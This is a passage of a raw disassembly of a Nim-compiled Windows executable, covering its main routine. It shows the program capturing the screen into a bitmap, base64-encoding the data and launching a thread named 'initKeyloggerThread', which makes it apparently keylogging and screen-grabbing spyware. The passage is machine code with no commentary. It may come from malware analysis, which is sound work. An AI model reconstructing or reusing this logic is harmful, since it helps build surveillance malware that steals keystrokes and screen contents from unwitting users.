  406332:	48 89 f1             	mov    %rsi,%rcx
  406335:	48 89 c7             	mov    %rax,%rdi
  406338:	e8 42 da ff ff       	call   403d7f <plusdollar___fd78UIeRDjLSmDeP2Y7tYgwinstr.lto_priv.69>
  40633d:	48 89 c1             	mov    %rax,%rcx
  406340:	e8 23 b2 ff ff       	call   401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.71>
  406345:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
  40634c:	00 
  40634d:	45 31 c0             	xor    %r8d,%r8d
  406350:	48 89 fa             	mov    %rdi,%rdx
  406353:	c7 44 24 28 04 01 00 	movl   $0x104,0x28(%rsp)
  40635a:	00 
  40635b:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  406361:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  406366:	ff 15 d4 49 02 00    	call   *0x249d4(%rip)        # 42ad40 <Dl_33565001_>
  40636c:	48 8b 8c 24 a0 00 00 	mov    0xa0(%rsp),%rcx
  406373:	00 
  406374:	ff 15 be 49 02 00    	call   *0x249be(%rip)        # 42ad38 <Dl_33290001_>
  40637a:	48 8d 6c 24 60       	lea    0x60(%rsp),%rbp
  40637f:	b9 4c 00 00 00       	mov    $0x4c,%ecx
  406384:	ff 15 7e 49 02 00    	call   *0x2497e(%rip)        # 42ad08 <Dl_29815001_>
  40638a:	b9 4d 00 00 00       	mov    $0x4d,%ecx
  40638f:	89 c7                	mov    %eax,%edi
  406391:	ff 15 71 49 02 00    	call   *0x24971(%rip)        # 42ad08 <Dl_29815001_>
  406397:	b9 4e 00 00 00       	mov    $0x4e,%ecx
  40639c:	41 89 c7             	mov    %eax,%r15d
  40639f:	ff 15 63 49 02 00    	call   *0x24963(%rip)        # 42ad08 <Dl_29815001_>
  4063a5:	b9 4f 00 00 00       	mov    $0x4f,%ecx
  4063aa:	41 89 c4             	mov    %eax,%r12d
  4063ad:	ff 15 55 49 02 00    	call   *0x24955(%rip)        # 42ad08 <Dl_29815001_>
  4063b3:	48 89 e9             	mov    %rbp,%rcx
  4063b6:	ba 10 00 00 00       	mov    $0x10,%edx
  4063bb:	41 29 fc             	sub    %edi,%r12d
  4063be:	89 c6                	mov    %eax,%esi
  4063c0:	48 83 c5 08          	add    $0x8,%rbp
  4063c4:	e8 f9 b5 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  4063c9:	44 29 fe             	sub    %r15d,%esi
  4063cc:	31 d2                	xor    %edx,%edx
  4063ce:	48 89 e9             	mov    %rbp,%rcx
  4063d1:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
  4063d8:	00 00 
  4063da:	89 f0                	mov    %esi,%eax
  4063dc:	c1 f8 1f             	sar    $0x1f,%eax
  4063df:	31 c6                	xor    %eax,%esi
  4063e1:	29 c6                	sub    %eax,%esi
  4063e3:	44 89 e0             	mov    %r12d,%eax
  4063e6:	c1 f8 1f             	sar    $0x1f,%eax
  4063e9:	41 31 c4             	xor    %eax,%r12d
  4063ec:	41 29 c4             	sub    %eax,%r12d
  4063ef:	e8 ce ca ff ff       	call   402ec2 <unsureAsgnRef>
  4063f4:	89 74 24 64          	mov    %esi,0x64(%rsp)
  4063f8:	41 0f af f4          	imul   %r12d,%esi
  4063fc:	48 8d 0d bd ee 01 00 	lea    0x1eebd(%rip),%rcx        # 4252c0 <NTI__6H5Oh5UUvVCLiakt9aTwtUQ_>
  406403:	44 89 64 24 60       	mov    %r12d,0x60(%rsp)
  406408:	8d 14 b5 00 00 00 00 	lea    0x0(,%rsi,4),%edx
  40640f:	48 63 d2             	movslq %edx,%rdx
  406412:	e8 c0 f2 ff ff       	call   4056d7 <newSeq>
  406417:	48 89 e9             	mov    %rbp,%rcx
  40641a:	48 89 c2             	mov    %rax,%rdx
  40641d:	e8 a0 ca ff ff       	call   402ec2 <unsureAsgnRef>
  406422:	31 c9                	xor    %ecx,%ecx
  406424:	ff 15 d6 48 02 00    	call   *0x248d6(%rip)        # 42ad00 <Dl_30180001_>
  40642a:	49 89 c4             	mov    %rax,%r12
  40642d:	48 89 c1             	mov    %rax,%rcx
  406430:	ff 15 9a 48 02 00    	call   *0x2489a(%rip)        # 42acd0 <Dl_25975001_>
  406436:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
  40643b:	4c 89 e1             	mov    %r12,%rcx
  40643e:	48 89 c5             	mov    %rax,%rbp
  406441:	8b 54 24 60          	mov    0x60(%rsp),%edx
  406445:	ff 15 7d 48 02 00    	call   *0x2487d(%rip)        # 42acc8 <Dl_25965001_>
  40644b:	48 89 e9             	mov    %rbp,%rcx
  40644e:	49 89 c5             	mov    %rax,%r13
  406451:	48 89 c2             	mov    %rax,%rdx
  406454:	ff 15 66 48 02 00    	call   *0x24866(%rip)        # 42acc0 <Dl_26815001_>
  40645a:	45 31 c0             	xor    %r8d,%r8d
  40645d:	31 d2                	xor    %edx,%edx
  40645f:	48 89 e9             	mov    %rbp,%rcx
  406462:	49 89 c6             	mov    %rax,%r14
  406465:	8b 44 24 64          	mov    0x64(%rsp),%eax
  406469:	44 89 7c 24 38       	mov    %r15d,0x38(%rsp)
  40646e:	89 7c 24 30          	mov    %edi,0x30(%rsp)
  406472:	4c 8d 7c 24 70       	lea    0x70(%rsp),%r15
  406477:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
  40647c:	48 89 df             	mov    %rbx,%rdi
  40647f:	c7 44 24 40 20 00 cc 	movl   $0xcc0020,0x40(%rsp)
  406486:	00 
  406487:	4c 89 fe             	mov    %r15,%rsi
  40648a:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
  40648f:	89 44 24 20          	mov    %eax,0x20(%rsp)
  406493:	ff 15 1f 48 02 00    	call   *0x2481f(%rip)        # 42acb8 <Dl_25910001_>
  406499:	4c 8b 4c 24 60       	mov    0x60(%rsp),%r9
  40649e:	ba 2c 00 00 00       	mov    $0x2c,%edx
  4064a3:	4c 89 f9             	mov    %r15,%rcx
  4064a6:	e8 17 b5 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  4064ab:	ba 2c 00 00 00       	mov    $0x2c,%edx
  4064b0:	4c 89 f9             	mov    %r15,%rcx
  4064b3:	e8 0a b5 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  4064b8:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  4064bd:	45 31 c0             	xor    %r8d,%r8d
  4064c0:	4c 89 fa             	mov    %r15,%rdx
  4064c3:	c7 44 24 70 28 00 00 	movl   $0x28,0x70(%rsp)
  4064ca:	00 
  4064cb:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4064d0:	4c 89 4c 24 74       	mov    %r9,0x74(%rsp)
  4064d5:	48 c7 44 24 7c 01 00 	movq   $0x200001,0x7c(%rsp)
  4064dc:	20 00 
  4064de:	48 c7 84 24 84 00 00 	movq   $0x0,0x84(%rsp)
  4064e5:	00 00 00 00 00 
  4064ea:	4c 8d 48 10          	lea    0x10(%rax),%r9
  4064ee:	48 c7 84 24 8c 00 00 	movq   $0x0,0x8c(%rsp)
  4064f5:	00 00 00 00 00 
  4064fa:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  406501:	00 00 00 00 
  406505:	f3 a5                	rep movsl (%rsi),(%rdi)
  406507:	48 8d b4 24 a0 00 00 	lea    0xa0(%rsp),%rsi
  40650e:	00 
  40650f:	b9 0b 00 00 00       	mov    $0xb,%ecx
  406514:	4c 89 ff             	mov    %r15,%rdi
  406517:	f3 a5                	rep movsl (%rsi),(%rdi)
  406519:	48 89 e9             	mov    %rbp,%rcx
  40651c:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  406523:	00 
  406524:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  40652b:	00 00 
  40652d:	ff 15 7d 47 02 00    	call   *0x2477d(%rip)        # 42acb0 <Dl_27160001_>
  406533:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
  406538:	48 89 e9             	mov    %rbp,%rcx
  40653b:	4c 89 ea             	mov    %r13,%rdx
  40653e:	44 8b 4c 24 64       	mov    0x64(%rsp),%r9d
  406543:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
  40654a:	00 
  40654b:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
  406550:	48 83 c0 10          	add    $0x10,%rax
  406554:	45 31 c0             	xor    %r8d,%r8d
  406557:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40655c:	ff 15 46 47 02 00    	call   *0x24746(%rip)        # 42aca8 <Dl_26365001_>
  406562:	4c 89 f2             	mov    %r14,%rdx
  406565:	48 89 e9             	mov    %rbp,%rcx
  406568:	ff 15 52 47 02 00    	call   *0x24752(%rip)        # 42acc0 <Dl_26815001_>
  40656e:	48 89 e9             	mov    %rbp,%rcx
  406571:	31 ed                	xor    %ebp,%ebp
  406573:	ff 15 27 47 02 00    	call   *0x24727(%rip)        # 42aca0 <Dl_26115001_>
  406579:	4c 89 e2             	mov    %r12,%rdx
  40657c:	31 c9                	xor    %ecx,%ecx
  40657e:	ff 15 74 47 02 00    	call   *0x24774(%rip)        # 42acf8 <Dl_30195001_>
  406584:	4c 89 e9             	mov    %r13,%rcx
  406587:	ff 15 0b 47 02 00    	call   *0x2470b(%rip)        # 42ac98 <Dl_26125001_>
  40658d:	44 8b 4c 24 60       	mov    0x60(%rsp),%r9d
  406592:	ba 18 00 00 00       	mov    $0x18,%edx
  406597:	8b 7c 24 64          	mov    0x64(%rsp),%edi
  40659b:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
  4065a2:	00 
  4065a3:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
  4065a8:	e8 15 b4 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  4065ad:	49 63 c9             	movslq %r9d,%rcx
  4065b0:	e8 fa db ff ff       	call   4041af <nimIntToStr>
  4065b5:	48 63 cf             	movslq %edi,%rcx
  4065b8:	48 89 84 24 a0 00 00 	mov    %rax,0xa0(%rsp)
  4065bf:	00 
  4065c0:	e8 ea db ff ff       	call   4041af <nimIntToStr>
  4065c5:	48 85 f6             	test   %rsi,%rsi
  4065c8:	48 89 84 24 a8 00 00 	mov    %rax,0xa8(%rsp)
  4065cf:	00 
  4065d0:	74 03                	je     4065d5 <NimMainInner+0x698>
  4065d2:	48 8b 2e             	mov    (%rsi),%rbp
  4065d5:	48 8d 45 02          	lea    0x2(%rbp),%rax
  4065d9:	b9 03 00 00 00       	mov    $0x3,%ecx
  4065de:	48 8d 7e 10          	lea    0x10(%rsi),%rdi
  4065e2:	48 99                	cqto
  4065e4:	48 f7 f9             	idiv   %rcx
  4065e7:	4c 8d 24 85 01 00 00 	lea    0x1(,%rax,4),%r12
  4065ee:	00 
  4065ef:	4c 89 e1             	mov    %r12,%rcx
  4065f2:	e8 55 d7 ff ff       	call   403d4c <rawNewString>
  4065f7:	4c 8d 5d fe          	lea    -0x2(%rbp),%r11
  4065fb:	45 31 c9             	xor    %r9d,%r9d
  4065fe:	31 d2                	xor    %edx,%edx
  406600:	4c 89 20             	mov    %r12,(%rax)
  406603:	4c 8d 50 10          	lea    0x10(%rax),%r10
  406607:	4c 8d 05 52 af 00 00 	lea    0xaf52(%rip),%r8        # 411560 <TM__Dxxq7QTRlE6trHff5kPzzw_2>
  40660e:	4d 39 cb             	cmp    %r9,%r11
  406611:	7f 0e                	jg     406621 <NimMainInner+0x6e4>
  406613:	4c 39 cd             	cmp    %r9,%rbp
  406616:	0f 8f 89 00 00 00    	jg     4066a5 <NimMainInner+0x768>
  40661c:	e9 15 01 00 00       	jmp    406736 <NimMainInner+0x7f9>
  406621:	42 8a 4c 0e 10       	mov    0x10(%rsi,%r9,1),%cl
  406626:	c0 e9 02             	shr    $0x2,%cl
  406629:	83 e1 3f             	and    $0x3f,%ecx
  40662c:	41 8a 8c 08 80 00 00 	mov    0x80(%r8,%rcx,1),%cl
  406633:	00 
  406634:	88 4c 10 10          	mov    %cl,0x10(%rax,%rdx,1)
  406638:	42 8a 4c 0e 10       	mov    0x10(%rsi,%r9,1),%cl
  40663d:	46 8a 64 0e 11       	mov    0x11(%rsi,%r9,1),%r12b
  406642:	c1 e1 04             	shl    $0x4,%ecx
  406645:	41 c0 ec 04          	shr    $0x4,%r12b
  406649:	83 e1 30             	and    $0x30,%ecx
  40664c:	44 09 e1             	or     %r12d,%ecx
  40664f:	83 e1 3f             	and    $0x3f,%ecx
  406652:	41 8a 8c 08 80 00 00 	mov    0x80(%r8,%rcx,1),%cl
  406659:	00 
  40665a:	88 4c 10 11          	mov    %cl,0x11(%rax,%rdx,1)
  40665e:	42 8a 4c 0e 11       	mov    0x11(%rsi,%r9,1),%cl
  406663:	46 8a 64 0e 12       	mov    0x12(%rsi,%r9,1),%r12b
  406668:	c1 e1 02             	shl    $0x2,%ecx
  40666b:	83 e1 3c             	and    $0x3c,%ecx
  40666e:	41 c0 ec 06          	shr    $0x6,%r12b
  406672:	44 09 e1             	or     %r12d,%ecx
  406675:	83 e1 3f             	and    $0x3f,%ecx
  406678:	41 8a 8c 08 80 00 00 	mov    0x80(%r8,%rcx,1),%cl
  40667f:	00 
  406680:	88 4c 10 12          	mov    %cl,0x12(%rax,%rdx,1)
  406684:	42 8a 4c 0e 12       	mov    0x12(%rsi,%r9,1),%cl
  406689:	49 83 c1 03          	add    $0x3,%r9
  40668d:	83 e1 3f             	and    $0x3f,%ecx
  406690:	41 8a 8c 08 80 00 00 	mov    0x80(%r8,%rcx,1),%cl
  406697:	00 
  406698:	88 4c 10 13          	mov    %cl,0x13(%rax,%rdx,1)
  40669c:	48 83 c2 04          	add    $0x4,%rdx
  4066a0:	e9 69 ff ff ff       	jmp    40660e <NimMainInner+0x6d1>
  4066a5:	4a 8d 34 0f          	lea    (%rdi,%r9,1),%rsi
  4066a9:	48 ff cd             	dec    %rbp
  4066ac:	44 8a 06             	mov    (%rsi),%r8b
  4066af:	48 8d 0d aa ae 00 00 	lea    0xaeaa(%rip),%rcx        # 411560 <TM__Dxxq7QTRlE6trHff5kPzzw_2>
  4066b6:	4d 8d 5c 12 01       	lea    0x1(%r10,%rdx,1),%r11
  4066bb:	4c 8d 52 02          	lea    0x2(%rdx),%r10
  4066bf:	41 c0 e8 02          	shr    $0x2,%r8b
  4066c3:	41 83 e0 3f          	and    $0x3f,%r8d
  4066c7:	49 39 e9             	cmp    %rbp,%r9
  4066ca:	46 8a 84 01 80 00 00 	mov    0x80(%rcx,%r8,1),%r8b
  4066d1:	00 
  4066d2:	44 88 44 10 10       	mov    %r8b,0x10(%rax,%rdx,1)
  4066d7:	44 8a 06             	mov    (%rsi),%r8b
  4066da:	74 44                	je     406720 <NimMainInner+0x7e3>
  4066dc:	4a 8d 74 0f 01       	lea    0x1(%rdi,%r9,1),%rsi
  4066e1:	41 c1 e0 04          	shl    $0x4,%r8d
  4066e5:	48 83 c2 03          	add    $0x3,%rdx
  4066e9:	44 8a 0e             	mov    (%rsi),%r9b
  4066ec:	41 83 e0 30          	and    $0x30,%r8d
  4066f0:	41 c0 e9 04          	shr    $0x4,%r9b
  4066f4:	45 09 c8             	or     %r9d,%r8d
  4066f7:	41 83 e0 3f          	and    $0x3f,%r8d
  4066fb:	46 8a 84 01 80 00 00 	mov    0x80(%rcx,%r8,1),%r8b
  406702:	00 
  406703:	45 88 03             	mov    %r8b,(%r11)
  406706:	44 8a 06             	mov    (%rsi),%r8b
  406709:	41 c1 e0 02          	shl    $0x2,%r8d
  40670d:	41 83 e0 3c          	and    $0x3c,%r8d
  406711:	42 8a 8c 01 80 00 00 	mov    0x80(%rcx,%r8,1),%cl
  406718:	00 
  406719:	42 88 4c 10 10       	mov    %cl,0x10(%rax,%r10,1)
  40671e:	eb 16                	jmp    406736 <NimMainInner+0x7f9>
  406720:	41 c1 e0 04          	shl    $0x4,%r8d
  406724:	41 83 e0 30          	and    $0x30,%r8d
  406728:	42 8a 94 01 80 00 00 	mov    0x80(%rcx,%r8,1),%dl
  40672f:	00 
  406730:	41 88 13             	mov    %dl,(%r11)
  406733:	4c 89 d2             	mov    %r10,%rdx
  406736:	48 89 c1             	mov    %rax,%rcx
  406739:	e8 c6 d9 ff ff       	call   404104 <setLengthStr>
  40673e:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
  406745:	00 
  406746:	31 c9                	xor    %ecx,%ecx
  406748:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
  40674f:	00 
  406750:	48 85 d2             	test   %rdx,%rdx
  406753:	74 03                	je     406758 <NimMainInner+0x81b>
  406755:	48 8b 0a             	mov    (%rdx),%rcx
  406758:	4c 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%r8
  40675f:	00 
  406760:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  406764:	31 c9                	xor    %ecx,%ecx
  406766:	4d 85 c0             	test   %r8,%r8
  406769:	74 03                	je     40676e <NimMainInner+0x831>
  40676b:	49 8b 08             	mov    (%r8),%rcx
  40676e:	48 01 d1             	add    %rdx,%rcx
  406771:	31 d2                	xor    %edx,%edx
  406773:	48 85 c0             	test   %rax,%rax
  406776:	74 03                	je     40677b <NimMainInner+0x83e>
  406778:	48 8b 10             	mov    (%rax),%rdx
  40677b:	48 01 d1             	add    %rdx,%rcx
  40677e:	e8 c9 d5 ff ff       	call   403d4c <rawNewString>
  406783:	4c 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%r8
  40678a:	00 
  40678b:	31 d2                	xor    %edx,%edx
  40678d:	4d 85 c0             	test   %r8,%r8
  406790:	74 03                	je     406795 <NimMainInner+0x858>
  406792:	49 8b 10             	mov    (%r8),%rdx
  406795:	48 89 c1             	mov    %rax,%rcx
  406798:	e8 0a de ff ff       	call   4045a7 <resizeString>
  40679d:	48 8b 94 24 a0 00 00 	mov    0xa0(%rsp),%rdx
  4067a4:	00 
  4067a5:	48 89 c1             	mov    %rax,%rcx
  4067a8:	49 89 c1             	mov    %rax,%r9
  4067ab:	e8 f3 b1 ff ff       	call   4019a3 <appendString.lto_priv.48>
  4067b0:	ba 01 00 00 00       	mov    $0x1,%edx
  4067b5:	4c 89 c9             	mov    %r9,%rcx
  4067b8:	e8 ea dd ff ff       	call   4045a7 <resizeString>
  4067bd:	48 8d 15 5c ae 00 00 	lea    0xae5c(%rip),%rdx        # 411620 <TM__fVqOpnb3Z6qf9aEcYGlvseQ_2>
  4067c4:	48 89 c1             	mov    %rax,%rcx
  4067c7:	49 89 c1             	mov    %rax,%r9
  4067ca:	e8 ae b1 ff ff       	call   40197d <appendString.part.0>
  4067cf:	48 8b 84 24 a8 00 00 	mov    0xa8(%rsp),%rax
  4067d6:	00 
  4067d7:	31 d2                	xor    %edx,%edx
  4067d9:	48 85 c0             	test   %rax,%rax
  4067dc:	74 03                	je     4067e1 <NimMainInner+0x8a4>
  4067de:	48 8b 10             	mov    (%rax),%rdx
  4067e1:	4c 89 c9             	mov    %r9,%rcx
  4067e4:	e8 be dd ff ff       	call   4045a7 <resizeString>
  4067e9:	48 8b 94 24 a8 00 00 	mov    0xa8(%rsp),%rdx
  4067f0:	00 
  4067f1:	48 89 c1             	mov    %rax,%rcx
  4067f4:	49 89 c1             	mov    %rax,%r9
  4067f7:	e8 a7 b1 ff ff       	call   4019a3 <appendString.lto_priv.48>
  4067fc:	ba 01 00 00 00       	mov    $0x1,%edx
  406801:	4c 89 c9             	mov    %r9,%rcx
  406804:	e8 9e dd ff ff       	call   4045a7 <resizeString>
  406809:	48 8d 15 10 ae 00 00 	lea    0xae10(%rip),%rdx        # 411620 <TM__fVqOpnb3Z6qf9aEcYGlvseQ_2>
  406810:	48 89 c1             	mov    %rax,%rcx
  406813:	49 89 c1             	mov    %rax,%r9
  406816:	e8 62 b1 ff ff       	call   40197d <appendString.part.0>
  40681b:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
  406822:	00 
  406823:	31 d2                	xor    %edx,%edx
  406825:	48 85 c0             	test   %rax,%rax
  406828:	74 03                	je     40682d <NimMainInner+0x8f0>
  40682a:	48 8b 10             	mov    (%rax),%rdx
  40682d:	4c 89 c9             	mov    %r9,%rcx
  406830:	e8 72 dd ff ff       	call   4045a7 <resizeString>
  406835:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
  40683c:	00 
  40683d:	48 89 c1             	mov    %rax,%rcx
  406840:	49 89 c1             	mov    %rax,%r9
  406843:	e8 5b b1 ff ff       	call   4019a3 <appendString.lto_priv.48>
  406848:	48 8d 0d 09 e8 01 00 	lea    0x1e809(%rip),%rcx        # 425058 <base64Ss__oiZt3HUh4E3gRrnK1to7IQ>
  40684f:	4c 89 ca             	mov    %r9,%rdx
  406852:	e8 a9 c6 ff ff       	call   402f00 <asgnRef.lto_priv.64>
  406857:	48 8d 0d 12 46 02 00 	lea    0x24612(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  40685e:	ff 15 50 1a 04 00    	call   *0x41a50(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  406864:	45 31 c9             	xor    %r9d,%r9d
  406867:	45 31 c0             	xor    %r8d,%r8d
  40686a:	31 d2                	xor    %edx,%edx
  40686c:	31 c9                	xor    %ecx,%ecx
  40686e:	ff 15 84 e8 01 00    	call   *0x1e884(%rip)        # 4250f8 <Dl_1285026_>
  406874:	48 8d 0d 45 33 02 00 	lea    0x23345(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  40687b:	48 c7 05 d2 45 02 00 	movq   $0xffffffffffffffff,0x245d2(%rip)        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  406882:	ff ff ff ff 
  406886:	4c 8b 3d df 19 04 00 	mov    0x419df(%rip),%r15        # 44826c <__imp_EnterCriticalSection>
  40688d:	48 89 05 04 46 02 00 	mov    %rax,0x24604(%rip)        # 42ae98 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x58>
  406894:	48 c7 05 c1 45 02 00 	movq   $0x0,0x245c1(%rip)        # 42ae60 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x20>
  40689b:	00 00 00 00 
  40689f:	41 ff d7             	call   *%r15
  4068a2:	48 8d 0d 57 b4 01 00 	lea    0x1b457(%rip),%rcx        # 421d00 <sharedHeap__R3bhvQCN0d6AYpkvxfT9aGw>
  4068a9:	ba 88 3e 00 00       	mov    $0x3e88,%edx
  4068ae:	e8 73 c2 ff ff       	call   402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>
  4068b3:	48 8d 0d 06 33 02 00 	lea    0x23306(%rip),%rcx        # 429bc0 <heapLock__Cm9aJxbMhUuv7Cj8trffHQw>
  4068ba:	48 8b 2d fb 19 04 00 	mov    0x419fb(%rip),%rbp        # 4482bc <__imp_LeaveCriticalSection>
  4068c1:	48 89 c6             	mov    %rax,%rsi
  4068c4:	ff d5                	call   *%rbp
  4068c6:	ba 88 3e 00 00       	mov    $0x3e88,%edx
  4068cb:	48 89 f1             	mov    %rsi,%rcx
  4068ce:	e8 ef b0 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  4068d3:	48 8d 05 f8 b0 ff ff 	lea    -0x4f08(%rip),%rax        # 4019d2 <initKeyloggerThread__LcMnpr43pCvLNLQ9bKGTVJw>
  4068da:	31 c9                	xor    %ecx,%ecx
  4068dc:	48 89 35 5d e7 01 00 	mov    %rsi,0x1e75d(%rip)        # 425040 <thr__6OCkUFmrNoAXK9buHED9cuYQ>
  4068e3:	48 89 05 66 e7 01 00 	mov    %rax,0x1e766(%rip)        # 425050 <thr__6OCkUFmrNoAXK9buHED9cuYQ+0x10>
  4068ea:	4c 8d 0d 4f e7 01 00 	lea    0x1e74f(%rip),%r9        # 425040 <thr__6OCkUFmrNoAXK9buHED9cuYQ>
  4068f1:	ba 00 f0 1f 00       	mov    $0x1ff000,%edx
  4068f6:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
  4068fb:	4c 8d 05 12 05 00 00 	lea    0x512(%rip),%r8        # 406e14 <threadProcWrapper__LGq7Tl8RtbZVKMdJtqW9aHA>
  406902:	c7 84 24 a0 00 00 00 	movl   $0x0,0xa0(%rsp)
  406909:	00 00 00 00 
  40690d:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
  406914:	00 
  406915:	ff 15 d5 e7 01 00    	call   *0x1e7d5(%rip)        # 4250f0 <Dl_1285210_>
  40691b:	48 85 c0             	test   %rax,%rax
  40691e:	48 89 05 23 e7 01 00 	mov    %rax,0x1e723(%rip)        # 425048 <thr__6OCkUFmrNoAXK9buHED9cuYQ+0x8>
  406925:	7f 7b                	jg     4069a2 <NimMainInner+0xa65>
  406927:	48 8d 0d 12 e9 01 00 	lea    0x1e912(%rip),%rcx        # 425240 <NTI__M8bPR1OE5OXPYGyQdVHfTg_>
  40692e:	ba 30 00 00 00       	mov    $0x30,%edx
  406933:	e8 ae d3 ff ff       	call   403ce6 <newObj>
  406938:	48 8d 0d 01 ad 00 00 	lea    0xad01(%rip),%rcx        # 411640 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_39>
  40693f:	48 89 c6             	mov    %rax,%rsi
  406942:	48 8b 7e 18          	mov    0x18(%rsi),%rdi
  406946:	48 8d 05 33 e9 01 00 	lea    0x1e933(%rip),%rax        # 425280 <NTI__KFG1Y2EPzgtJWwuYhMD0Fw_>
  40694d:	48 89 06             	mov    %rax,(%rsi)
  406950:	48 8d 05 fb 58 00 00 	lea    0x58fb(%rip),%rax        # 40c252 <.rdata+0x252>
  406957:	48 89 46 10          	mov    %rax,0x10(%rsi)
  40695b:	e8 e0 d2 ff ff       	call   403c40 <copyStringRC1>
  406960:	48 85 ff             	test   %rdi,%rdi
  406963:	48 89 46 18          	mov    %rax,0x18(%rsi)
  406967:	74 08                	je     406971 <NimMainInner+0xa34>
  406969:	48 89 f9             	mov    %rdi,%rcx
  40696c:	e8 c0 c5 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.79>
  406971:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
  406975:	31 d2                	xor    %edx,%edx
  406977:	e8 84 c5 ff ff       	call   402f00 <asgnRef.lto_priv.64>
  40697c:	4c 8d 0d e6 58 00 00 	lea    0x58e6(%rip),%r9        # 40c269 <.rdata+0x269>
  406983:	48 89 f1             	mov    %rsi,%rcx
  406986:	48 c7 44 24 20 0b 01 	movq   $0x10b,0x20(%rsp)
  40698d:	00 00 
  40698f:	4c 8d 05 df 58 00 00 	lea    0x58df(%rip),%r8        # 40c275 <.rdata+0x275>
  406996:	48 8d 15 b5 58 00 00 	lea    0x58b5(%rip),%rdx        # 40c252 <.rdata+0x252>
  40699d:	e8 16 e9 ff ff       	call   4052b8 <raiseExceptionEx>
  4069a2:	4c 8d 2d 57 44 02 00 	lea    0x24457(%rip),%r13        # 42ae00 <NTI__77mFvmsOLKik79ci2hXkHEg_>
  4069a9:	b9 0a 00 00 00       	mov    $0xa,%ecx
  4069ae:	ff 15 34 32 02 00    	call   *0x23234(%rip)        # 429be8 <Dl_14037864_>
  4069b4:	31 d2                	xor    %edx,%edx
  4069b6:	c6 05 73 e6 01 00 00 	movb   $0x0,0x1e673(%rip)        # 425030 <channel__N5eXcSZk9cFx3Xyn4EpWNYw>
  4069bd:	48 8d 0d 74 e6 01 00 	lea    0x1e674(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  4069c4:	e8 f9 c4 ff ff       	call   402ec2 <unsureAsgnRef>
  4069c9:	31 d2                	xor    %edx,%edx
  4069cb:	c6 05 5e e6 01 00 00 	movb   $0x0,0x1e65e(%rip)        # 425030 <channel__N5eXcSZk9cFx3Xyn4EpWNYw>
  4069d2:	48 8d 0d 5f e6 01 00 	lea    0x1e65f(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  4069d9:	e8 e4 c4 ff ff       	call   402ec2 <unsureAsgnRef>
  4069de:	48 83 3d 72 44 02 00 	cmpq   $0xfffffffffffffffe,0x24472(%rip)        # 42ae58 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x18>
  4069e5:	fe 
  4069e6:	0f 84 53 01 00 00    	je     406b3f <NimMainInner+0xc02>
  4069ec:	48 8d 0d 7d 44 02 00 	lea    0x2447d(%rip),%rcx        # 42ae70 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x30>
  4069f3:	ff 15 33 19 04 00    	call   *0x41933(%rip)        # 44832c <__imp_TryEnterCriticalSection>
  4069f9:	85 c0                	test   %eax,%eax
  4069fb:	0f 84 3e 01 00 00    	je     406b3f <NimMainInner+0xc02>
  406a01:	48 83 3d 47 44 02 00 	cmpq   $0x0,0x24447(%rip)        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  406a08:	00 
  406a09:	0f 8e 27 01 00 00    	jle    406b36 <NimMainInner+0xbf9>
  406a0f:	c6 05 92 44 02 00 01 	movb   $0x1,0x24492(%rip)        # 42aea8 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x68>
  406a16:	48 8b 05 33 44 02 00 	mov    0x24433(%rip),%rax        # 42ae50 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x10>
  406a1d:	48 85 c0             	test   %rax,%rax
  406a20:	7e 12                	jle    406a34 <NimMainInner+0xaf7>
  406a22:	4c 39 2d 77 44 02 00 	cmp    %r13,0x24477(%rip)        # 42aea0 <mainThread__B7bJyClR3J8biZ7mpTlhzA+0x60>
